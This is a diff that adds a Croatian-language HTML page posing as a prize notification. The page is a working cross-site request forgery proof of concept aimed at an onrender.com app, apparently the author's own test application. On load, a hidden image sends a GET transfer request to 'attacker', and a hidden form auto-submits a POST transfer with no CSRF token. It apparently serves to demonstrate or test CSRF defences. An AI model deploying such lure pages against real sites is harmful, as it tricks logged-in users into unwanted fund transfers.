@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Nagrada</title></head>
+<body>
+  <h1>Osvojili ste nagradu!</h1>
+  <p>Čestitamo! Kliknite bilo gdje za preuzimanje nagrade...</p>
+
+  <!-- GET napad: slika koja okida /transfer zahtjev -->
+  <img src="https://tvoja-app.onrender.com/transfer?to=attacker&amount=100" style="display:none">
+
+  <!-- POST napad: skriveni obrazac koji se sam šalje, bez CSRF tokena -->
+  <form id="poc" method="post" action="https://tvoja-app.onrender.com/transfer">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="100">
+  </form>
+  <script>document.getElementById('poc').submit();</script>
+</body>
+</html>
